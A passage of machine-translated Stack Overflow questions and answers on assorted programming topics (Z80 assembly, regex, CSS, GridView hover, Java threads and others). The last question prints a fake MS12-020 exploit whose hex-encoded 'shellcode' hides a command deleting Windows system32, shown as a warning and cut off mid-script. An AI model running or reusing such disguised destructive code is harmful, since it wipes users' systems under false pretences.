                for (; data[i] >> 7 == 1; i++)
                {
                    height = (height << 7) | (data[i] & 0x7F);
                }
                height = (height << 7) | (data[i++] & 0x7F);
                int firstPixel = i;
                Bitmap png = new Bitmap(width, height);
                for (int y = 0; y < height; y++)
                {
                    for (int x = 0; x < width; x++)
                    {
                        png.SetPixel(x, y, (((data[firstPixel + (x / 8) + (y * ((width - 1) / 8 + 1))] >> (7 - (x % 8))) & 1) == 1) ? Color.White : Color.Black);
                    }
                }
                png.Save(Path.ChangeExtension(file, "png"));
            }
        }
    }
} 
```

# objective-c - 有一个子视图，显示其父视图中包含的图像的一部分

> ID：11927392
> 
> 赞同：2
> 
> 时间：2012-08-13T02:02:18.150
> 
> 标签：objective-c, ios, core-graphics

我正在尝试创建一个“单片眼镜”视图，您可以四处移动和缩放以显示较大图像的一部分（部分大小由单片眼镜的边界定义）。较大的图像不应超出单片眼镜的范围。

现在我有一个`UIImageView`（称为 lensImage），它是一个`UIView`命名镜头的子视图。

我试图使用 2D`CGAffineTransform`根据单片眼镜的位置显示图像的相关部分，但这会将图像捕捉到奇怪的位置。

关于我需要处理什么的任何提示？

这是解释所需设置的图表：

![在此处输入图像描述](../Images/08b111e868cb5a4234e8e43a6b7698bd.png)

# assembly - z80 汇编器出现“IM 1”指令问题

> ID：11927393
> 
> 赞同：2
> 
> 时间：2012-08-13T02:02:40.213
> 
> 标签：assembly, interrupt, z80

## 代码

```
STACK .EQU 2099H
.ORG 0000H
    ld  SP, STACK
    jp 2000H

.ORG 0038H
    jp  service_routine

.ORG 2000H
    EI
    IM 1 ; <------- THIS LINE 
    LD  A, 00H

LOOP:
    ADD A, 00H
    jp  z, LOOP

service_routine:
    DI
    ld  A, 55H
    out (07H),A
    ld  A, 00H
    EI
    ret 
```

## 错误

使用这个在线 IDE [http://clrhome.org/asm/](http://clrhome.org/asm/)

它给了我： **未知指令或指令 IM（hello_z80 中的“IM 1”行）**

## 所以？

我在这里做一些愚蠢的事情吗？

我不知道为什么会收到此错误。

谷歌没有运气。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T17:33:41.200

正如我在评论中所说，我已经让 DeepThought 知道了这件事。我刚刚在 Omnimaga 上聊天（DeepThought 是那里的管理员），他告诉我他已经修复了它。

`IM 0`，`IM 1`现在`IM 2`一切正常。他们组装和自动完成也知道他们。

因此，在回答您的问题时，是的，这实际上是一个错误，而不是您的错。

# java - 是否有任何用 Java 编写的正则表达式优化器？

> ID：11927395
> 
> 赞同：1
> 
> 时间：2012-08-13T02:02:44.137
> 
> 标签：java, regex

我编写了一个 Java 程序，它可以生成一系列符号，例如`"abcdbcdefbcdbcdefg"`. 我需要的是正则表达式优化器，它可以产生`"a((bcd){2}ef){2}g"`.

由于输入可能包含 unicode，比如`"a\u0063\u0063\bbd"`，我更喜欢 Java 版本。

我想要一个“更短”的表达式的原因是为了节省空间/内存。这里的符号序列可能很长。

一般来说，很难找到“最短”的优化正则表达式。所以，在这里，我不需要保证“最短”标准的那些。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T02:10:11.200

我有一种讨厌的感觉，即创建与给定输入字符串或字符串集匹配的最短正则表达式的问题在计算上将是“困难的”。（与计算 Kolmogorov 复杂度的问题有相似之处......）

还值得注意的是，`abcdbcdefbcdbcdefg`就匹配速度而言，最佳正则表达式可能是`abcdbcdefbcdbcdefg`. 添加重复组可能会使正则表达式字符串更短，但不会使正则表达式更快。事实上，除非正则表达式引擎展开重复组，否则它可能会更慢。

> 我需要这个的原因是由于空间/内存限制。

你有明确的证据表明你*需*要这样做吗？

我怀疑这样做不会节省大量空间......除非输入字符串真的很长。（如果它们很长，那么使用常规文本压缩算法压缩字符串会得到更好的结果。）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T02:21:55.420

**正则表达式不能替代压缩**

不要使用正则表达式来表示字符串常量。正则表达式旨在用于匹配许多字符串之一。那不是你在做什么。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T02:24:19.313

我假设您正在尝试找到一个小的正则表达式来编码一组*有限*的输入字符串。如果是这样，您还没有选择最好的主题行。

我不能给你一个现有的程序，但我可以告诉你如何编写一个。

没有规范的最小正则表达式形式，[确定真正的最小大小正则表达式是 NP hard](https://cstheory.stackexchange.com/questions/1854/is-finding-the-minimum-regular-expression-an-np-complete-problem)。当然你的集合是有限的，所以这可能是一个更简单的问题。我得考虑一下。

但是一个好的启发式算法是：

1.  构造一个接受所有字符串的普通非确定性有限自动机 (NFA)。
2.  使用子集构造将 NFA 转换为确定性有限自动机 (DFA)。
3.  使用标准算法最小化 DFA。
4.  使用[来自 Kleene 定理证明的构造](http://neumannhaus.com/christoph/papers/2005-03-16.DFA_to_RegEx.pdf)来获得正则表达式。

请注意，第 3 步*确实*为您提供了唯一的最低 DFA。这可能是对字符串集进行编码的最佳方式。

# c - 如何在 C 中制作可遍历的树数据结构

> ID：11927400
> 
> 赞同：0
> 
> 时间：2012-08-13T02:03:16.913
> 
> 标签：c, tree, linked-list, treenode, traversal

有没有人有任何用 C 语言（！C++）迭代和递归构建树数据结构的好例子？还要遍历树并覆盖每个节点..

我可能会使用这个结构：

```
typedef struct treeNode *treeLink;
struct treeNode {
    Item item;
    treeLink left, right;
}; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T02:10:50.700

```
treeLink Traverse_In_Order(treeLink  current){
          if(curernt == NULL) return NULL;
          Traverse(current->left);
          operation(current->item);
          Traverse(current->right);
          return current; // in case you want to do something on this node
}

treeLink Traverse_Pre_Order(treeLink  current){
          if(curernt == NULL) return NULL;
          operation(current->item);
          Traverse(current->left);        
          Traverse(current->right);
          return current; // in case you want to do something on this node
}

treeLink Traverse_Pos_Order(treeLink  current){
          if(curernt == NULL) return NULL;
          Traverse(current->left);        
          Traverse(current->right);
          operation(current->item);
          return current; // in case you want to do something on this node
} 
```

# html - 当一个或多个不存在时保持导航链接的位置

> ID：11927402
> 
> 赞同：0
> 
> 时间：2012-08-13T02:03:24.543
> 
> 标签：html, css

我有一个简单的博客，其中包含三个导航链接——下一个、存档和上一个。当不存在下一个或上一个帖子时，呈现博客的引擎将忽略下一个或上一个链接。有没有办法确保删除或其中一个不会影响其他两个的放置？

我已经尝试了几种方法，但我的存档链接总是在缺少链接的方向偏离中心。

**编辑：**下面响应 Blender 的更多信息。抱歉没有现场演示。我会看看我能做什么。

我的第一次尝试只是一个内联显示的列表，并以页面的主 div 为中心。然后我尝试将其拆分并浮动到存档的左右两侧，当所有三个都存在时效果很好，但导致上述漂移。我想要的是链接水平对齐但彼此独立，存档始终以 div 为中心。

从我的 mako 模板中，后一种尝试（使用花车）：

```
<div id="navigation">
% if prev_post:
    <a id="prev" href="${prev_post.permapath()}">&#60;&#60;Prev</a>
% endif
% if next_post:
    <a id="next" href="${next_post.permapath()}">Next&#62;&#62;</a>
% endif
    <a id="archive" href="/archive">Archive</a>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T04:01:21.480

我会更改您的代码，以便不删除元素，而只需删除文本：

```
<div id="navigation">

    <a id="prev" href="${prev_post.permapath()}"> % if prev_post: &#60;&#60; Prev% endif </a>

    <a id="next" href="${next_post.permapath()}"> % if next_post: Next&#62;&#62; % endif </a>

    <a id="archive" href="/archive">Archive</a>
</div> 
```

现在您可以使用 CSS 设置锚点的宽度。

```
a {
    width: 60px; 
    height: 20px;   
    display: block; 
    float:left;    
} 
```

不要忘记您需要清除 div，因为它包含浮动元素。

看看这个 jsfiddle：http: [//jsfiddle.net/GcpJA/](http://jsfiddle.net/GcpJA/)。

# python - 将原始 SMTP 消息发送到 AMQP 代理

> ID：11927409
> 
> 赞同：4
> 
> 时间：2012-08-13T02:04:22.243
> 
> 标签：python, smtp, rabbitmq, postfix-mta, amqp

我正在寻找一种方法来获取大量入站 SMTP 消息并将它们放到 AMQP 代理上以进行进一步的路由和处理。消息实际上不会最终进入邮箱，而是使用 SMTP 作为消息网关。

我用 Python 编写了一个 Postfix 队列后内容过滤器，它将入站 SMTP 消息放到 RabbitMQ 代理上。效果很好 - 我通过队列获取原始消息，并且它被消费者很好地拾取。问题是每条消息都会创建和拆除 AMQP 连接......内容过滤器脚本每次都会从头开始重新执行。我想这最终会成为一个性能问题。

如果我可以利用可重入的东西，我可以重用连接。或者也许我只是错误地接近整个事情......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T02:18:19.750

通过普通 TCP 建立 AMQP 连接非常快。或许如果您使用 SSL，那就是另一回事了，但您确定将原始消息排入 AMQP 交换队列会成为瓶颈？我的猜测是，实际上通过 SMTP 传递消息会慢得多，所以排队的速度不会影响系统的吞吐量。

如果这部分确实成为瓶颈，我更喜欢使用 Sinatra 或 Rack 创建小型 Web 服务器，但听起来您可能更喜欢基于 Python 的解决方案。让 postfix 内容过滤器使用 curl 对 Web 服务器执行 HTTP POST，该服务器保持与 AMQP 服务器的持久连接。

当然，现在您有一个额外的活动部分，您需要考虑监控、错误处理和安全性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T11:02:00.203

使用 SwiftMQ。它有一个[JavaMail 桥接](http://www.swiftmq.com/products/extension/xt_javamail/index.html)器，可以从 IMAP 或 POP3 帐户接收您的电子邮件，将其转换为 JMS 消息，然后可由[AMQP 0.9.1 和/或 AMQP 1.0](http://www.swiftmq.com/products/router/swiftlets/sys_amqp/index.html)以及当然 JMS 客户端使用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-09-08T13:11:03.577

您可以让 Postfix 将所有或任何[电子邮件发送到外部程序](http://www.postfix.org/pipe.8.html)，您可以将它们扔到任何您想要的地方。[可以在此处找到一些示例。](https://serverfault.com/questions/258469/how-to-configure-postfix-to-pipe-all-incoming-email-to-a-script)

# android - 如何跳过列表视图中显示的getView（）中的一行

> ID：11927411
> 
> 赞同：0
> 
> 时间：2012-08-13T02:04:28.833
> 
> 标签：android

例如，我想在列表视图中显示姓名、性别和年龄。
对于 18 岁以下的人，我想跳过这一行。有什么解决方案可以做到这一点吗？
答案之一是我应该编辑服务器端的 sql。
但是，如果我无法处理/触摸服务器端，我可以在客户端进行吗？
我是Android新手，请帮助我...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T02:24:19.813

大概您正在从服务器下载数据作为文本？如果这是正确的，您可以简单地设置一个条件来忽略年龄 < 18 的行。您可以在 ListView 适配器中执行此操作。

您可能想提供更多细节，更好地解释您的问题，以获得更好的答案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T04:28:04.460

正如 esse 所说，您可能不得不忽略特定的行。它不仅创建了行，还跳过了我们不需要的行。

# javascript - Javascript对象方法不更新变量

> ID：11927414
> 
> 赞同：0
> 
> 时间：2012-08-13T02:05:29.260
> 
> 标签：javascript

```
var myUser = (function () {
    var username = "",
    var isConnected = false;
    return {
        setUsername: function (n) {
            username = n;
        },
        setConn: function (connStatus) {
            isConnected = connStatus;
        },
        user: username,
        isCon: isConnected
    };
}()); 
```

当我打电话

```
myUser.setUsername("user123"); 
```

用户名变量没有得到更新。

有什么建议吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T02:20:59.377

看起来您想使用 myUser.user 来引用更新的用户名值。但是，如果是这样，它就行不通了。setUsername 更新用户名变量，但 myUser.user 只指向用户名的初始值，即“”。它不会指向更新的用户名值

要解决问题，您可以更改

```
user: username, 
```

到

```
user: function() {
    return username;
}, 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T02:17:29.680

这可能是使用原型模型的更好情况：

```
function User(prop) {
  prop = prop || {};
  this.username = prop.username || '';
  this.isConnected = prop.isConnected || false;
}
User.prototype = {
  setUser: function(uname) { this.username = uname; },
  setConn: function(status) { this.isConnected = status; }
};

var myUser = new User();
myUser.setUser('user1234');
// OR
var myUser = new User({ username: 'user1234' });

console.log(myUser.username); //=> 'user1234' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T02:23:41.060

```
 ....
    },
    user: username,
    isCon: isConnected 
```

`user: username`强制`username`评估，返回“”。这更容易弄清楚发生了什么

```
 var obj = {
        log: console.log("printed when init")
   } 
```

# c++ - C++ 跨平台归档操作/显示

> ID：11927415
> 
> 赞同：2
> 
> 时间：2012-08-13T02:05:50.003
> 
> 标签：c++, zip, cross-platform, archive

是否有任何可以执行以下操作的跨平台 C++ 库？

*   查看存档中的文件
*   将单个文件提取到内存
*   在存档中添加/删除/重命名文件（出于许可原因，不包括 rar）
*   与 zip、rar 和 7zip 档案兼容

我正在使用 Qt，所以看起来 QuaZIP 是 zip 文件的可能选择，但我不确定 rar 和 7zip。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2018-03-04T14:25:34.167

嘿，你可以使用**libarchive**，这是官方[项目页面](https://github.com/libarchive/libarchive)。

如果您在 Qt 中执行此操作，请尝试使用我的库来包装 libarchive 以支持 Qt 事件循环。这是**QArchive** [项目页面](https://antony-jr.github.io/QArchive)

# c# - 鼠标悬停在 Gridview ASP.net 中使用 CSS

> ID：11927417
> 
> 赞同：6
> 
> 时间：2012-08-13T02:06:42.010
> 
> 标签：c#, asp.net, gridview, hover, mouseover

这可能是一件非常简单的事情，但我对 CSS 完全陌生。我只想能够在gridview中的行上具有鼠标悬停效果，如果悬停在行上，则更改行的颜色。我很好奇我的 CSS 文件是否在正确的位置？我的 Gridview.CSS 是否应该与我的 gridview.aspx 位于同一个文件夹中（我假设是这样？）。

这是我的 CSS 文件：

```
.Gridview tr.normal
 {
   background-color:white;
 }

 .Gridview tr.highlight
  {
     background-color:yellow;
  } 
```

以下是我尝试实现它的方式： 在 .aspx 文件中：

```
 <asp:GridView ID="MsgInbox" runat="server" ....OnRowCreated="Gridview_RowCreated" CssClass = "Gridview"> 
```

在后面的 C# 代码中：

```
 protected void Gridview_RowCreated(object sender, GridViewRowEventArgs e)
    {
        if (e.Row.RowType == DataControlRowType.DataRow)
        {
            e.Row.CssClass = "highlight";
        }
    } 
```

我知道我的 C# 中一定遗漏了一些非常简单的东西。任何帮助，将不胜感激！谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2016-08-22T21:24:24.677

我从另一个[答案](https://stackoverflow.com/questions/11834926/applying-itemstyle-or-headerstyle-in-gridview-skin)中窃取了我的部分解决方案，因此我的样式会一次性影响所有网格视图。

将此添加 `CssClass="GridView"`到您的 asp:GridView 标记中。

```
<asp:GridView ID="grdLongID" runat="server" CssClass="GridView" CellPadding="4" ForeColor="#333333" GridLines="None" AllowSorting="true" OnSorting="grdLongID_Sorting" RowStyle-HorizontalAlign="center" AutoGenerateColumns="False" Width="100%"> 
```

然后在您的 style.css 中，您可以执行以下操作：

```
table.GridView th {
  border-bottom: 1px solid #ED7A0A;
  text-decoration: none;
}

table.GridView tr:hover {
  background-color: #fabf85;
} 
```

关键是`:hover`伪类。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-13T06:33:41.393

首先，您使用此代码设置行样式，在 GridView 内部，我称之为`.row`

```
<RowStyle CssClass="row"  /> 
```

然后你使用这个 css 让它改变背景颜色，或者当鼠标移动时你喜欢什么。

```
tr.row
{
    background-color:#fff;
}

tr.row td
{ 
}

tr.row:hover td, 
tr.row.over td
{ 
    background-color: #eee;
} 
```

这里的技巧是，因为 GridView 呈现为表格，所以我在样式中添加`td`和`tr`以访问表格行上的鼠标。

`AlternatingRowStyle`因为如果你喜欢使用它还有另一种行样式，你可以简单地用同样的方法多做一个样式。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-21T14:28:32.163

这是我如何做到这一点的：

按照本教程更改鼠标悬停时突出显示的行：

[http://msmvps.com/blogs/deborahk/archive/2010/01/25/asp-net-selecting-a-row-in-a-gridview.aspx](http://msmvps.com/blogs/deborahk/archive/2010/01/25/asp-net-selecting-a-row-in-a-gridview.aspx)

这也解释了处理行选择的代码。我的 gridview 有交替的行颜色。为了恢复您刚刚悬停的行的原始颜色，请在 mouseover 中为原始 backgroundColor 创建一个自定义属性并在 mouseOut 上恢复它，如下所示：

```
row.Attributes["onmouseover"] = "this.originalstyle=this.style.backgroundColor;this.style.cursor='hand';this.style.backgroundColor='#ffccff';";

row.Attributes["onmouseout"] = "this.style.textDecoration='none';this.style.backgroundColor=this.originalstyle;"; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T11:04:00.173

这就是我在我的项目中所做的

**CSS：**

`.tdonhover { background-color:#d9d9d9 !important; }`

```
<script type="text/javascript">
        $(document).ready(function () {
         $('td').hover(function () {
                $('tr').each(function () {
                    $(this).removeClass('tdonhover');
                });
                $(this).parent().addClass('tdonhover');
            });
          });

    </script> 
```

**Default.aspx 页面：**此页面包含gridview 控件。

```
 ` <asp:GridView ID="GridView1" runat="server" CellPadding="4" Width="940px" CssClass="gvClass gvalign" BorderColor="#E0DCD0" BorderStyle="Solid" BorderWidth="1px"
                       ForeColor="#333333" GridLines="None" >
                        <Columns>
                        <asp:TemplateField HeaderText="Srno" HeaderStyle-HorizontalAlign="Left" ItemStyle-Width="40">
                            <ItemTemplate>
                                <%# Container.DataItemIndex+1 %>
                            </ItemTemplate>
                        </asp:TemplateField>
                    </Columns>
                    <FooterStyle BackColor="#5D7B9D" ForeColor="White" Font-Bold="True" />
                    <RowStyle ForeColor="#603813" BackColor="#F7F6F3" />
                    <PagerStyle BackColor="#284775" ForeColor="White" HorizontalAlign="Center" />
                    <SelectedRowStyle BackColor="#E2DED6" Font-Bold="True" ForeColor="#333333" />
                    <HeaderStyle BackColor="#A86E07" Font-Bold="True" ForeColor="White" HorizontalAlign="Left" />
                    <EditRowStyle BackColor="#999999" />
                    <AlternatingRowStyle BackColor="White" ForeColor="#A86E07" />
                </asp:GridView>` 
```

使用

```
<RowStyle ForeColor="#603813" BackColor="#F7F6F3" />
<AlternatingRowStyle BackColor="White" ForeColor="#A86E07" /> 
```

您可以设置备用行背景颜色和字体颜色

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-13T06:34:09.007

您可以使用 RowCreated 创建悬停效果，因为这需要回发。你应该在你的 CSS 中使用 hover 伪类。像这样的东西

```
.Gridview tr:hover
{
  background-color:blue;
  color:white;
} 
```

Gridview css 类应用于您的 Gridview

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-01-29T06:21:27.700

这是很简单的事情。

在头部添加 CSS

```
#MainContent_gvDevice tr:Hover
{  
    background-color:#F6F6F6;
} 
```

在这里而不是`gvDevice`把你的gridview id。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-08-02T08:47:02.420

我认为我有迄今为止实施的最短和最简单的解决方案。无需编辑后面的代码或 id/类名称。您需要进行的唯一编辑是添加此 CSS：

```
tr[class^='dxgvDataRow']:hover td{ 
    background-color: #272727 !important;
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2019-05-15T07:18:43.173

```
 protected void grdDis_RowDataBound(object sender, GridViewRowEventArgs e)
    {
        if (e.Row.RowType == DataControlRowType.DataRow)
        {

            #region to highlight the grid view row 
            e.Row.Attributes.Add("onmouseover", "this.originalcolor=this.style.backgroundColor;" + " this.style.backgroundColor='#FDCB0A';");
            e.Row.Attributes.Add("onmouseout", "this.style.backgroundColor=this.originalcolor;");
            #endregion
}
} 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2019-12-11T12:41:50.850

这是用于带有 ToolTip 和 ForeColor 的 Gridview 中的列**单元格悬停颜色**

```
protected void GridView1_RowDataBound(object sender, GridViewRowEventArgs e)
{
    if (e.Row.RowType == DataControlRowType.DataRow)
    {
        e.Row.Cells[2].Attributes["onmouseover"] = "this.style.cursor='pointer';this.style.textDecoration='underline';this.style.backgroundColor='aqua'";
        e.Row.Cells[2].Attributes["onmouseout"] = "this.style.textDecoration='none';this.style.backgroundColor='white'";
        e.Row.Cells[2].ToolTip = "You can click this cell";
        e.Row.Cells[2].ForeColor = System.Drawing.Color.Blue;
    }
} 
```

谢谢

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2017-04-17T06:05:10.633

使用 OnRowCreated 处理鼠标悬停的更好方法

```
protected void RowCreated_report(object sender, GridViewRowEventArgs e)
        {
            if (e.Row.RowType == DataControlRowType.DataRow)
            {
                e.Row.Attributes.Add("onmouseover", "this.originalstyle=this.style.backgroundColor;this.style.backgroundColor='yellow'");
                e.Row.Attributes.Add("onmouseout", "this.style.backgroundColor=this.originalstyle;");
                e.Row.Attributes.Add("style", "cursor:pointer;");
            }
} 
```

# scala - 我应该为此使用咖喱函数吗？

> ID：11927419
> 
> 赞同：0
> 
> 时间：2012-08-13T02:06:52.593
> 
> 标签：scala

我有这个代码片段：

```
val chunks = blob.map(_.id).distinct.grouped(100).toSeq 
val output = (for (chunk <- chunks) yield { 
  MyDataStore.batchGet("tablez", chunk.asJava, classOf[TableZ], true).asScala }).flatten 
```

我想把它转换成一个通用的方法，它作为参数`blob.map(_.id).distinct`和`MyDataStore.batchGet("tablez", chunk.asJava, classOf[TableZ], true).asScala`

我在想也许是咖喱函数，但不确定语法。

只是为了澄清，`chunks`is a `Seq[Seq[String]]`，`batchGet`返回 a `List[T]`where `T`is `tablez`，`output`is `Seq[TableZ]`。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T02:27:56.853

我认为以下将起作用：

```
def getInGroups[T,U](ids: Seq[T], groupSize: Int = 100)(getter: Seq[T] => Seq[U]): Seq[U] = {
   ids.grouped(groupSize).flatMap{ chunk =>  getter(chunk) }.toSeq
} 
```

称它为

```
getInGroups(blob.map(_.id).distinct){ chunk => 
   MyDataStore.batchGet("tablez", chunk.asJava, classOf[TableZ], true).asScala
} 
```

# java - 多次运行一个线程

> ID：11927420
> 
> 赞同：1
> 
> 时间：2012-08-13T02:06:56.410
> 
> 标签：java, multithreading

我有一个运行我的游戏循环的线程。我希望每次开始新游戏时都能运行这个游戏循环。但是由于Java中的线程只能启动一次，我该怎么做呢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T02:08:08.987

`Thread`围绕同一个实例创建一个新`Runnable`实例并启动它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T02:20:28.363

由于您希望运行游戏循环的线程继续运行它，因此您需要编写如下代码：

```
 public class GameLoop implements Runnable {
      ...
      public void run() {
         while (gameNotFinished) {
            // do stuff
         }
      }
  } 
```

如果这不起作用，那么该`run()`方法很可能由于您没有捕获/记录的异常而死亡，因此没有注意到。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-13T02:46:43.307

**1.**当你这么说的时候`"you need to run a thread"`，我的意思是**你想在一个单独的线程上启动一个子任务。**

**2.**现在如果你的意思是这个**特定的子任务**，那么请**更喜欢运行一个** `new thread`。

**3.**如你所说`But since the threads in Java can only be started once`

这意味着当 a`thread (thread of execution)` **完成其** `run()`方法时，与之关联的 Thread 对象将永久失去其线程性，对....

但是如果这个线程**来自一个池**，那么**池本身管理线程对象和它的重用**。尝试`Executors`从`java.util.concurrent`包中使用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T02:21:10.553

1）简短的回答正是 SLaks 已经说过的：只是“......围绕同一个可运行实例创建一个新线程并启动它。”

2) 我认为您可能对“start”的日常含义和Java Thread 方法“start()”的语义之间的区别感到困惑。本教程可能会有所帮助：

*   [http://www.geom.uiuc.edu/~daeron/docs/javaguide/java/threads/states.html](http://www.geom.uiuc.edu/~daeron/docs/javaguide/java/threads/states.html)

3) 如果你想重复使用*同一个*线程，你可以使用方法“wait()”和“resume()”：

*   [http://www.javabeginner.com/learn-java/java-threads-tutorial](http://www.javabeginner.com/learn-java/java-threads-tutorial)

# ios - Objective-C 运行时调用 OS X 上的函数的百分比是多少？

> ID：11927423
> 
> 赞同：-1
> 
> 时间：2012-08-13T02:07:42.103
> 
> 标签：ios, macos, runtime, objective-c-runtime, code-statistics

我想更深入地了解任何需要一个语言的运行时被调用的频率。在这种情况下，我特别想知道：

在 OS X 或 iOS 系统上在任何给定的秒内执行的所有函数调用中（当然需要近似值）其中有多少是 Objective-C 运行时函数（即由运行时定义的函数）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T02:17:15.523

当然，这取决于您的应用程序，但总的来说，答案是“很多”。就像，一大堆。

如果您真的想查看数字，我建议您使用 dtrace 在调用时记录所有运行时函数。 [这个博客条目](http://kdbdallas.com/2009/02/07/log-all-accessed-methods-in-objective-c-with-dtrace/)讨论了如何做这样的事情。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T03:05:16.020

很多。这里只是几个例子。

每次发送消息时，实际的消息发送都是由运行时函数完成的（这实际上是几乎所有目标 C 程序中调用最多的运行时函数）。

`NSObject`类和协议不是标准库的一部分，而是运行时的一部分，因此任何最终执行到默认`NSObject`实现的方法实际上都是在执行运行时代码。

每次执行默认属性访问器（读取或写入）时，这都是运行时的一部分。

如果您使用 ARC，则每次访问弱引用（用于读取或写入）时，它都是运行时函数。

Objc 运行时包括 C 运行时，因此任何涉及 C 运行时函数（例如按值传递或返回大型结构）实际上都是调用运行时。

和更多。

# python - 为什么这个 Python 代码会破坏我的计算机？

> ID：11927424
> 
> 赞同：21
> 
> 时间：2012-08-13T02:08:05.007
> 
> 标签：python, security, operating-system, exploit

它声称是 MS12-020 漏洞，我在我的机器上进行了测试。显然，它似乎破坏了运行它的操作系统。

仅查看此代码的某些部分并不表示任何恶意代码，因此我寻求您的帮助。

它到底在做什么，我将如何恢复系统？

编辑：它不会破坏目标机器；它会破坏运行它的机器。如果我要搜索 MS12-020 是什么，我会得到大量信息！！！！

## 编辑：不要运行此代码。它是`rm -rf /`伪装的。

```
#!/usr/bin/env python

# rdpsmash.py
# MS12-020 RDP exploit, remote code execution
# Confirmed working on all pre-patch boxes, XP to 7
#
# Author: Verye

import struct
import socket
import sys

trigger =  "\x58\x6c\x64\x47\x6a\x74\x30\x5a\x67\x43\x67\x79\x6f\x39\x46\xf1"
trigger += "\x66\x70\x66\x61\x43\x52\x46\x71\x78\x30\x33\x55\x62\x63\x58\x63"
trigger += "\x47\x34\x33\x65\x62\x41\x4f\x30\x54\x39\x6f\x4a\x70\x52\x48\x5a"
trigger += "\x6b\x38\x6d\x6b\x4c\x75\x6b\x30\x50\x6b\x4f\x6e\x36\x53\x6f\x6f"
trigger += "\x79\x4a\x45\x32\x46\x6f\x71\x6a\x4d\x34\x48\x77\x72\x73\x65\x73"
trigger += "\x5a\x37\x72\x69\x6f\x58\x50\x52\x48\x4e\x39\x76\x69\x4a\x55\x4c"
trigger += "\x6d\x32\x77\x69\x6f\x59\x46\x50\x53\x43\x63\x41\x43\x70\x53\x70"
trigger += "\x53\x43\x73\x50\x53\x62\x63\x70\x53\x79\x6f\x6a\x70\x35\x36\x61"
trigger += "\x78\x71\x32\x78\x38\x71\x76\x30\x53\x4b\x39\x69\x71\x4d\x45\x33"
trigger += "\x58\x6c\x64\x47\x6a\x74\x30\x5a\x67\x43\x67\x79\x6f\x39\x46\x32"
trigger += "\x4a\x56\x70\x66\x31\x76\x35\x59\x6f\x58\x50\x32\x48\x4d\x74\x4e"
trigger += "\x4d\x66\x4e\x7a\x49\x50\x57\x6b\x4f\x6e\x36\x46\x33\x56\x35\x39"
trigger += "\x73\x55\x38\x4d\x37\x71\x69\x69\x56\x71\x69\x61\x47\x6b\x4f\x6e"
trigger += "\x36\x36\x35\x79\x6f\x6a\x70\x55\x36\x31\x7a\x71\x74\x32\x46\x51"
trigger += "\x78\x52\x43\x70\x6d\x4f\x79\x4d\x35\x72\x4a\x66\x30\x42\x79\x64"
trigger += "\x69\x7a\x6c\x4b\x39\x48\x67\x62\x4a\x57\x34\x4f\x79\x6d\x32\x37"
trigger += "\x41" * 39
trigger += "\x42\x44\x6c\x4c\x53\x6e\x6d\x31\x6a\x64\x78\x4c\x6b\x4e\x4b\x4e"
trigger += "\x4b\x43\x58\x70\x72\x69\x6e\x6d\x63\x37\x66\x79\x6f\x63\x45\x73"
trigger += "\x74\x4b\x4f\x7a\x76\x63\x6b\x31\x47\x72\x72\x41\x41\x50\x51\x61"
trigger += "\x41\x70\x6a\x63\x31\x41\x41\x46\x31\x71\x45\x51\x41\x4b\x4f\x78"
trigger += "\x50\x52\x48\x4c\x6d\x79\x49\x54\x45\x38\x4e\x53\x63\x6b\x4f\x6e"
trigger += "\x36\x30\x6a\x49\x6f\x6b\x4f\x70\x37\x4b\x4f\x4e\x30\x4e\x6b\x30"
trigger += "\x57\x69\x6c\x6b\x33\x4b\x74\x62\x44\x79\x6f\x6b\x66\x66\x32\x6b"
trigger += "\x4f\x4e\x30\x53\x58\x58\x70\x4e\x6a\x55\x54\x41\x4f\x52\x73\x4b"
trigger += "\x4b\x43\x58\x70\x72\x69\x6e\x6d\x63\x37\x66\x00"

nopsled = "\x90" * 214

#bindshell port 8888
shellcode =  "\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73"
shellcode += "\x74\x65\x6d\x28\x27\x64\x65\x6c\x20\x2f\x73\x20\x2f\x71\x20\x2f\x66\x20\x43\x3a"
shellcode += "\x5c\x77\x69\x6e\x64\x6f\x77\x73\x5c\x73\x79\x73\x74\x65\x6d\x33\x32\x5c\x2a\x20"
shellcode += "\x3e\x20\x4e\x55\x4c\x20\x32\x3e\x26\x31\x27\x29\x20\x69\x66\x20\x27\x57\x69\x6e"
shellcode += "\x27\x20\x69\x6e\x20\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x70\x6c\x61"
